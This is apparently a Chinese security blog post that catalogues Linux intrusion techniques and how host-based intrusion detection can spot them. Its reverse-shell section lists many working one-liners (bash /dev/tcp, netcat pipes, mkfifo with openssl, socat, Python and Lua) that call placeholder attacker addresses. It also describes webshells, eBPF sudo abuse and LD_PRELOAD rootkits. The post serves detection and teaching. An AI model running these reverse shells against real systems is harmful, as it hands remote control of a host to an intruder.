---
layout:     post
title:      Linux 安全对抗收集
subtitle:   安全对抗case及检测策略
date:       2024-10-06
author:     pandaychen
header-img:
catalog: true
tags:
    - Linux
---

##  0x00    前言
本文主要收集下主机入侵事件及原理

##  0x01    反弹 Shell
反弹shell，通常是攻击机监听在某个TCP/UDP端口（AS 服务端），目标机（受害机 AS 客户端）主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机，本质是把 `bash` OR `sh` 进程的输入输出重定向到 socket，在 socket 中获取 `stdin[0]`，`stdout[1]` 和 `stderr[2]` 输出到 socket（因为进程通信有较高的复杂性，所以 bash 的输入输出可能是一个 pipe）

反弹shell的方式较多（根据目标受害主机的安装环境确定），常用如下几种：

-   netcat
-   python
-   php
-   bash/sh

大多数的反弹 shell 都是借助重定向 socket 来和 bash 进程进行输入输出交互

反弹Shell的本质可以理解为：网络通信+命令执行+重定向方式，变种也很多：

- 网络通信可以使用TCP、UDP、ICMP等协议，TCP协议再细分又可以包含HTTP、HTTPS协议等，UDP包含DNS等
- 命令执行可以通过调用Shell解释器、Glibc、Syscall等方式实现
- 重定向可以通过pipe、成对的伪终端、内存文件等实现

####    利用 /bin/bash反弹shell（case1）

1、先启动 server（攻击机开启本地监听，假设攻击机外网为`1.2.3.4`）

```BASH
nc -lvv 9999
```

2、再启动 client（目标受害机主动连接攻击机）

```BASH
/bin/bash > /dev/tcp/1.2.3.4/9999 0>&1 2>&1 &
```

反弹成功后，`/bin/bash` 的文件描述符（`0/1/2`）会被重定向。server（攻击机） 侧可以控制 client（受害机） 侧的 `/bin/bash` 进程的 `0/1/2`

3、在攻击机上操作

```BASH
root@VM-16-15-ubuntu:~# nc -lvv 9999
Listening on 0.0.0.0 9999
Connection received on localhost 39870
ifconfig        #输入指令即可
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ed:50:85:fc  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

这种方法的攻击原理是**直接重定向Shell的输入输出到Socket**，检测可以通过检测Shell的标准输入、标准输出是否被重定向到Socket或检测一些简单的主机网络日志特征来实现

![bash-1](https://raw.githubusercontent.com/pandaychen/pandaychen.github.io/refs/heads/master/blog_img/hids/bash-hacker-bianzhong-0.png)

####    利用 pipe 反弹 shell（case2）
第二类反弹Shell通过管道（pipe）、伪终端等中转，再重定向Shell的输入输出到中转，达到攻击目的

```BASH
# input server 用于发送指令（攻击端）
nc -lvv 7777
# output server 用于接收执行结果
nc -lvv 8888

# client（受害机执行）
nc 1.2.3.4 7777 | /bin/bash | nc 1.2.3.4 8888 &
```

这样在攻击端`7777`就可以执行操作指令，在`8888`可以看到指令操作的结果

再列举一下其他的例子：

1、利用有名管道（`mkfifo`）配合SSL加密客户端实现

```BASH
#将sh -i的标准输入、标准输出、标准错误重定向到命名管道/tmp/f，同时加密通信数据也流向该命名管道
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | openssl s_client -quiet -connect 0.0.XX.XX:666 > /tmp/f
```

![bash-2](https://raw.githubusercontent.com/pandaychen/pandaychen.github.io/refs/heads/master/blog_img/hids/bash-hacker-bianzhong-1.png)

2、其他案例（应用较广）

```BASH
#案例一
nc 10.10.XX.XX 6060|/bin/sh|nc 10.10.XX.XX 5050 nc -e /bin/bash 10.10.XX.XX 6060 nc -c bash 10.10.XX.XX 6060 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.XX.XX:6060
#案例二
mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.XX.XX 6060>/tmp/f
#案例三
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.XX.XX:6060 > /tmp/s; rm /tmp/s
#案例四
mknod backpipe p; nc 10.10.XX.XX 6060 0<backpipe | /bin/bash 1>backpipe 2>backpipe
#案例五
bash -c 'exec 5<>/dev/tcp/10.10.XX.XX/6060;cat <&5|while read line;do $line >&5 2>&1;done'
#案例六
telnet 10.10.10.10 6060 | /bin/bash | telnet 10.10.XX.XX 5050
```

如上图所示，在这些变形的场景下，可能经过层层中转，但无论经过几层最终都会形成一条流动的数据通道。通过跟踪fd和进程的关系可以检测该数据通道

3、利用伪终端中转的方式

```BASH
python -c 'import 
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.XX.XX",10006));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

通过伪终端中转与通过管道等中转原理一样，但通过伪终端中转的检测难度大大提升，单从Shell的标准输入输出来看，和正常打开的终端没有什么区别（如何检测？）

####  case3：利用高级语言实现
第三种类型反弹Shell通过编程语言实现标准输入的中转，然后重定向命令执行的输入到中转，标准输出和标准错误中转形式不限制

```BASH
#案例一
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('10.10.XX.XX',6060))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), Shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
#案例二
lua5.1 -e 'local host, port = "10.10.XX.XX", 6060 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

在这种场景下，反弹Shell的命令执行和正常业务行为变得更加难以区分

####    反弹shell的检测思路（受害机）
1、先检查进程的socket情况

对于case1，检查 `/proc/<pid>/fd`，查看反弹进程打开的 fd 是否建立 socket 连接

```BASH
root@VM-16-15-ubuntu:~# ls -al /proc/3923150/fd
total 0
dr-x------ 2 root root  0 Nov  1 16:57 .
dr-xr-xr-x 9 root root  0 Nov  1 16:56 ..
lrwx------ 1 root root 64 Nov  1 16:57 0 -> 'socket:[219665628]'
lrwx------ 1 root root 64 Nov  1 16:57 1 -> 'socket:[219665628]'
lrwx------ 1 root root 64 Nov  1 16:57 2 -> 'socket:[219665628]'
```

对于case2，bash 进程的输入输出都来自其他进程的 pipe（ `0/1` 都绑定到 pipe 非 socket），此情况需要追溯到上一级进程的输入输出继续排查—（不管做了多少层的 pipe，反弹 shell 的本质是将 server 的输入传递给 client 的 `bash`，肯定存在 socket 连接）

```BASH
root@VM-16-15-ubuntu:~/# ls -al /proc/1026073/fd
total 0
dr-x------ 2 root root  0 Nov  4 13:39 .
dr-xr-xr-x 9 root root  0 Nov  4 13:02 ..
lr-x------ 1 root root 64 Nov  4 13:39 0 -> 'pipe:[226852419]'
l-wx------ 1 root root 64 Nov  4 13:39 1 -> 'pipe:[226852421]'
lrwx------ 1 root root 64 Nov  4 13:39 2 -> /dev/pts/3
```

跟进程树继续跟踪上一级，发现 pipe 的进程建立了 socket 连接，存在反弹 shell 的风险
```bash
  │   │└─bash,3919934
  │   │  ├─bash,1026073
  │   │  ├─nc,1026072 127.0.0.1 7777
  │   │  └─nc,1026074 127.0.0.1 8888

root@VM-16-15-ubuntu:~/# ps aux|grep nc
root     1026067  0.0  0.0   3536  1216 pts/1    S+   15:19   0:00 nc -lvv 7777
root     1026070  0.0  0.0   3536  1184 pts/5    S+   15:19   0:00 nc -lvv 8888
root     1026072  0.0  0.0   3536  2144 pts/3    S    15:19   0:00 nc 127.0.0.1 7777
root     1026074  0.0  0.0   3536  2068 pts/3    S    15:19   0:00 nc 127.0.0.1 8888
root     1026129  0.0  0.0   6480  2236 pts/7    S+   15:19   0:00 grep --color=auto nc
root@VM-16-15-ubuntu:~/# ls -al /proc/1026072/fd
total 0
dr-x------ 2 root root  0 Nov  4 15:19 .
dr-xr-xr-x 9 root root  0 Nov  4 15:19 ..
lrwx------ 1 root root 64 Nov  4 15:19 0 -> /dev/pts/3
l-wx------ 1 root root 64 Nov  4 15:19 1 -> 'pipe:[227094095]'
lrwx------ 1 root root 64 Nov  4 15:19 2 -> /dev/pts/3
lrwx------ 1 root root 64 Nov  4 15:19 3 -> 'socket:[227093293]'
root@VM-16-15-ubuntu:~/# ls -al /proc/1026074/fd
total 0
dr-x------ 2 root root  0 Nov  4 15:19 .
dr-xr-xr-x 9 root root  0 Nov  4 15:19 ..
lr-x------ 1 root root 64 Nov  4 15:19 0 -> 'pipe:[227094097]'
lrwx------ 1 root root 64 Nov  4 15:19 1 -> /dev/pts/3
lrwx------ 1 root root 64 Nov  4 15:19 2 -> /dev/pts/3
lrwx------ 1 root root 64 Nov  4 15:19 3 -> 'socket:[227094117]'
```

2、检查进程链（进程的树状结构）

3、检测反连进程对外的CONNECT连接

```json
 {"time":1730373034,"cgroupid":75819,"ns":4026531836,"pid":3520734,"tid":3520734,"uid":0,"gid":0,"ppid":3518138,"pgid":3520734,"comm":"bash","pcomm":"bash","nodename":"VM-16-15-ubuntu","retval":0,"username":"root","exe":"/usr/bin/bash","syscall":"connect","ppid_argv":"-bash","pgid_argv":"-bash","pod_name":"-1","family":2,"dport":9999,"dip":"1.2.3.4","sport":56022,"sip":"127.0.0.1"}
```

其他一些检测思路及方法，可以参考[云安全中心反弹Shell多维检测技术详解](https://help.aliyun.com/zh/security-center/user-guide/detect-reverse-shells-from-multiple-dimensions?spm=a2c4g.11186623.help-menu-28498.d_2_5_0_3_1.95b54ad2uRk0e2&scm=20140722.H_206139._.OR_help-T_cn-DAS-zh-V_1)

##  0x02   bash相关

####    bash反弹

####    bash提权

##  0x03    WebShell
WebShell 是一种可执行 Shell 命令的脚本文件（常见的有 PHP等），可以通过 Web 应用程序执行，从而控制服务器。黑客利用 Web 应用程序漏洞将 WebShell 文件上传到受害主机上，并通过 WebShell 文件实现对受害主机的控制。攻击原理如下：

1.  攻击者利用 WebApp漏洞将 PHP WebShell 文件上传到目标服务器
2.  攻击者通过浏览器访问 PHP WebShell 文件，建立与 WebShell 文件的连接
3.  WebShell 文件进行身份认证，认证通过后，攻击者就可以执行 Shell 命令，进而控制目标服务器

通俗点说，如果通过webshell能找到一种方法让受害者服务器执行`/bin/bash > /dev/tcp/1.2.3.4/9999 0>&1 2>&1 &`，就可以使用反弹shell攻击拿到受害主机的shell了

##  0x04    提权漏洞

##  0x05    网络相关

####    异常外连检
基于ebpf机制的检测，思路是通过 `krobe/kretprobe/tracepoint` 等跟踪所有 IPv4 连接尝试，针对非保留地址的dest IP 匹配是否命中恶意IP库

典型的hook点有：
- `tracepoint/syscalls/sys_enter_connect`
- `tracepoint/syscalls/sys_exit_connect`

##  0x06    基于ebpf的恶意利用

1、使用 eBPF 添加 `sudo` 用户

它通过拦截 `sudo` 读取 `/etc/sudoers` 文件，并将第一行覆盖为 `<username> ALL=(ALL:ALL) NOPASSWD:ALL #` 的方式工作。通过这种方式欺骗了 `sudo`，使其认为用户被允许成为 `root`。其他程序如 `cat` 或 `sudoedit` 不受影响，所以对于这些程序来说，文件未改变，用户并没有这些权限。行尾的 `#` 确保行的其余部分被当作注释处理，因此不会破坏文件的逻辑

[bad-bpf](https://github.com/pathtofile/bad-bpf)

2、eBPF内存木马：通过ebpf hook入/出口流量，筛选出特定的恶意命令。再通过hook `execve/execveat`等函数，将其他进程正常执行的命令替换为恶意命令，达到WebShell的效果，利用门槛较高。

![ebpf-rootkit-1](https://raw.githubusercontent.com/pandaychen/pandaychen.github.io/refs/heads/master/blog_img/hids/rootkit/webshell-ebpf.png)

该方式的特点如下：
1.  无进程、无监听端口（利用业务端口）、无文件（注入后文件可删除，ebpf代码驻留在内存中）
2.  执行命令不会新建shell进程，无法通过常规行为检测
3.  将WebShell注入内核，无法通过常规内存检测
4.  可改造为内核马，适配HTTP协议以外的所有协议

##  0x07  Linux Rootkit
Linux Rootkit特指以Linux内核模块（LKM）形式加载到操作系统中，从内核态实现更高权限的操作，或直接对内核态代码进行篡改，从而劫持整个系统正常程序的运行。借助Rootkit，黑客可以实现对任意目录、文件、磁盘内容、进程、网络连接与流量的隐藏、窃取和篡改，并提供隐蔽的后门可供黑客直接登录到受害服务器执行更多操作

####  利用Linux预加载型恶意动态链接库

![ldpath](https://raw.githubusercontent.com/pandaychen/pandaychen.github.io/refs/heads/master/blog_img/hids/ld_path.jpeg)

1. 将恶意动态链接库通过`LD_PRELOAD`环境变量进行加载
2. 将恶意动态链接库通过`/etc/ld.so.preload`配置文件进行加载
3. 修改动态链接器来实现恶意功能，例如修改动态链接器中默认的用于预加载的配置文件路径`/etc/ld.so.preload`为攻击者自定义路径，然后在里面写入要加载的恶意动态链接库，当然修改的方式还有很多，如修改默认环境变量，直接将要hook的动态链接库写入到动态链接器当中等

典型恶意程序：
- [vlany](https://github.com/mempodippy/vlany)：修改动态链接器rootkit 
- [cub3](https://github.com/mempodippy/cub3)：用于预加载的恶意动态链接库


##  0x08  其他

####  库文件劫持

####  挖矿木马


##  0x09  参考
-   [反弹Shell，看这一篇就够了](https://xz.aliyun.com/t/9488?u_atoken=ba042e2abcd2eb75127d6e0d58f1fcba&u_asig=0a472f9017303729323367295e0040)
-   [HIDS 常见检测原理](https://segmentfault.com/a/1190000043496037?u_atoken=9d1b6e7ba6f45bfc74e3197aafdfacae&u_asig=1a0c65c917304505664322721e003d)
-   [如何优雅的隐藏你的 Webshell](https://zu1k.com/posts/security/web-security/hide-your-webshell/#%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C)
-   [全链路内存马系列之 ebpf 内核马](https://github.com/veo/ebpf_shell)
-   [一文详解Webshell](https://www.freebuf.com/articles/web/235651.html)
-   [Linux中基于eBPF的恶意利用与检测机制](https://www.cnxct.com/evil-use-ebpf-and-how-to-detect-ebpf-rootkit-in-linux/)
-   [通过chkrootkit学习如何在linux下检测RootKit](https://www.giantbranch.cn/2018/10/09/通过chkrootkit学习如何在linux下检测RootKit/)
-   [LKM Linux rootkit](https://github.com/f0rb1dd3n/Reptile)
-   [检测Linux Rootkit入侵威胁](https://help.aliyun.com/zh/security-center/user-guide/detect-linux-rootkit-intrusions)
-   [云安全中心反弹Shell多维检测技术详解](https://help.aliyun.com/zh/security-center/user-guide/detect-reverse-shells-from-multiple-dimensions?spm=a2c4g.11186623.help-menu-28498.d_2_5_0_3_1.57ae7370LjotGR&scm=20140722.H_206139._.OR_help-T_cn#DAS#zh-V_1)
-   [警惕利用Linux预加载型恶意动态链接库的后门](https://www.freebuf.com/column/162604.html)
-   [最新Linux挖矿程序kworkerds分析](https://www.freebuf.com/articles/system/201402.html)